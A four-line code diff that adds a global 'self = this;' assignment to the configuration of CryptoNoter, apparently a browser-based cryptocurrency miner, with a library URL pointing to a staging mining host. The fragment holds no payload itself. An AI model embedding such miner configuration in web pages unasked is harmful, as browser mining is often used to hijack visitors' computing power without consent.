@@ -1,3 +1,4 @@
+self = this;
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
     LIB_URL: "https://staging-mining.cryptocades.com/lib/",
